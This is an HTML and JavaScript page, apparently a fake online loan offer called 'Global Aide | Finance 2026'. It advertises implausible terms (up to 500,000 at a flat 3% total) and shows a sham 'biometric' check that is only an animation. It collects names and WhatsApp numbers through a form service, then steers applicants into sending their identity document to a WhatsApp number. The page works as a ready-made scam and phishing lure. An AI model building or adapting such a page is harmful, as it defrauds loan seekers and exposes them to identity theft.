<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Aide | Finance 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #1d4ed8; }
        body { background-color: #F8FAFC; color: #1e293b; overflow-x: hidden; }
        .step { display: none; animation: fadeIn 0.4s ease-out; }
        .step.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .glass-card { background: white; border-radius: 32px; border: 1px solid #e2e8f0; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
        .btn-elite { background: var(--primary); color: white; transition: all 0.3s; box-shadow: 0 10px 25px rgba(29, 78, 216, 0.3); }
        .lang-card { border: 2px solid transparent; background: white; cursor: pointer; }
        .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
        #preview-img { width: 100%; border-radius: 15px; border: 2px solid #1d4ed8; margin-top: 10px; display: none; }
        .scan-line { width: 100%; height: 2px; background: #3b82f6; position: absolute; top: 0; left: 0; box-shadow: 0 0 10px #3b82f6; display: none; }
        @keyframes scanMove { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
    </style>
</head>
<body class="font-sans">

    <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center p-6 text-center">
        <h1 class="text-3xl font-black text-blue-900 mb-10 uppercase italic">GLOBAL EVOLUTION</h1>
        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-10">
            <div onclick="selectLang('fr', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-fr">
                <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] uppercase">Français</span>
            </div>
            <div onclick="selectLang('es', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-es">
                <span class="text-3xl">🇪🇸</span><span class="font-bold text-[10px] uppercase">Español</span>
            </div>
        </div>
        <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black uppercase flex items-center justify-center gap-3">
            <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-chevron-right"></i>
        </button>
    </section>

    <section id="step-sim" class="step min-h-screen flex-col p-4">
        <div class="max-w-xl mx-auto w-full pt-6">
            <div class="glass-card p-8">
                <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulateur</h2>
                
                <div class="space-y-10">
                    <div>
                        <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                            <span id="lbl-amt">Montant</span>
                            <div class="flex items-center gap-2">
                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editAmount()"></i>
                                <span class="text-blue-700 text-lg"><span id="val-amt">1000</span> <span class="curr">€</span></span>
                            </div>
                        </div>
                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="1000" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                    </div>

                    <div>
                        <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                            <span id="lbl-dur">Durée</span>
                            <div class="flex items-center gap-2">
                                <i class="fas fa-pen text-blue-500 text-[10px] cursor-pointer" onclick="editYear()"></i>
                                <span class="text-blue-700 text-lg"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span>
                            </div>
                        </div>
                        <input type="range" id="yearRange" min="2" max="30" step="1" value="2" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                    </div>
                </div>

                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden">
                    <div class="flex justify-between items-center mb-4">
                        <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-300">Mensualité</span>
                        <span id="res-monthly" class="text-3xl font-black">--</span>
                    </div>
                    <div class="flex justify-between items-center border-t border-blue-800 pt-4">
                        <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-300">Total (3% inclus)</span>
                        <span id="res-total" class="font-bold text-xl">--</span>
                    </div>
                    <p class="text-[9px] mt-4 text-blue-200 italic" id="lbl-grace">(*) Le remboursement commence après 3 mois.</p>
                </div>

                <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-6 rounded-full font-black mt-8 uppercase text-sm">Passer au dossier</button>
            </div>
        </div>
    </section>

    <section id="step-form" class="step min-h-screen flex-col p-4">
        <div class="max-w-xl mx-auto w-full pb-20">
            <div class="glass-card p-8">
                <form action="https://formspree.io/f/mzdkpgay" method="POST" id="mainForm" onsubmit="handleFinalSubmit(event)">
                    <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
                    
                    <div class="grid grid-cols-2 gap-4 mb-4">
                        <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                        <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
                    </div>
                    <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">

                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" id="scan-zone" onclick="startScan()">
                        <div id="scan-line" class="scan-line" style="animation: scanMove 2s infinite linear;"></div>
                        <div id="scan-icon" class="text-blue-200"><i class="fas fa-fingerprint text-6xl"></i></div>
                        <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4">BIOMÉTRIE</p>
                    </div>

                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center">
                        <input type="file" id="file-input" accept="image/*" class="hidden" onchange="previewImage(event)">
                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold shadow-sm">
                            <i class="fas fa-camera mr-2"></i> <span id="btn-photo-text">Choisir photo</span>
                        </button>
                        <img id="preview-img" src="" alt="Aperçu">
                    </div>

                    <button type="submit" id="btn-submit" class="btn-elite w-full py-6 rounded-full font-black uppercase text-sm mt-8">Confirmer l'inscription</button>
                </form>
            </div>
        </div>
    </section>

    <script>
        let cL = 'fr', cC = '€', isScanned = false;
        const tr = {
            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnPhoto: "Prendre / Choisir photo", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plWa: "WhatsApp" },
            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnPhoto: "Tomar / Elegir foto", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plWa: "WhatsApp" }
        };

        function selectLang(l, c) {
            cL = l; cC = c;
            document.querySelectorAll('.lang-card').forEach(b => b.classList.remove('selected'));
            document.getElementById('btn-' + l).classList.add('selected');
            updateUI();
        }

        function editAmount() {
            let n = prompt("Montant :", document.getElementById('amountRange').value);
            if(n && !isNaN(n)) { document.getElementById('amountRange').value = n; updateSim(); }
        }

        function editYear() {
            let n = prompt("Années (2-30) :", document.getElementById('yearRange').value);
            if(n && !isNaN(n) && n >= 2 && n <= 30) { document.getElementById('yearRange').value = n; updateSim(); }
        }

        function updateSim() {
            const a = parseFloat(document.getElementById('amountRange').value);
            const y = parseInt(document.getElementById('yearRange').value);
            document.getElementById('val-amt').innerText = a.toLocaleString();
            document.getElementById('val-dur').innerText = y;
            const total = Math.round(a * 1.03); 
            const monthly = Math.round(total / (y * 12));
            document.getElementById('res-monthly').innerText = monthly.toLocaleString() + " " + cC;
            document.getElementById('res-total').innerText = total.toLocaleString() + " " + cC;
            document.querySelectorAll('.curr').forEach(e => e.innerText = cC);
        }

        function startScan() {
            if(isScanned) return;
            document.getElementById('scan-line').style.display = 'block';
            document.getElementById('scan-text').innerText = "ANALYSE...";
            setTimeout(() => {
                document.getElementById('scan-line').style.display = 'none';
                document.getElementById('scan-icon').innerHTML = '<i class="fas fa-check-circle text-6xl text-green-500"></i>';
                document.getElementById('scan-text').innerText = tr[cL].scanOk;
                isScanned = true;
            }, 2000);
        }

        function previewImage(event) {
            const reader = new FileReader();
            reader.onload = () => { 
                const img = document.getElementById('preview-img');
                img.src = reader.result; img.style.display = 'block';
            };
            reader.readAsDataURL(event.target.files[0]);
        }

        function handleFinalSubmit(event) {
            event.preventDefault();
            if(!isScanned) { alert("Veuillez valider la biométrie."); return; }
            
            const name = document.getElementById('i-nom').value;
            const amt = document.getElementById('val-amt').innerText;
            const msg = `Bonjour, je suis ${name}. Voici ma pièce d'identité pour mon prêt de ${amt} ${cC}.`;
            
            fetch(event.target.action, { method: 'POST', body: new FormData(event.target), headers: { 'Accept': 'application/json' }})
            .then(() => { window.location.href = `https://wa.me/2290199915433?text=${encodeURIComponent(msg)}`; });
        }

        function updateUI() {
            const t = tr[cL];
            document.getElementById('btn-cont-text').innerText = t.cont;
            document.getElementById('sim-title').innerText = t.sim;
            document.getElementById('lbl-amt').innerText = t.amt;
            document.getElementById('lbl-dur').innerText = t.dur;
            document.getElementById('lbl-years').innerText = t.yr;
            document.getElementById('res-lbl-men').innerText = t.men;
            document.getElementById('res-lbl-tot').innerText = t.tot;
            document.getElementById('form-title').innerText = t.fTitle;
            document.getElementById('btn-photo-text').innerText = t.btnPhoto;
            document.getElementById('btn-submit').innerText = t.btnSubmit;
            document.getElementById('scan-text').innerText = isScanned ? t.scanOk : t.scan;
            document.getElementById('i-pre').placeholder = t.plPre;
            document.getElementById('i-nom').placeholder = t.plNom;
            document.getElementById('i-wa').placeholder = t.plWa;
            updateSim();
        }

        function goToStep(s) {
            document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
            document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
        }
        window.onload = () => { selectLang('fr', '€'); };
    </script>
</body>
</html>
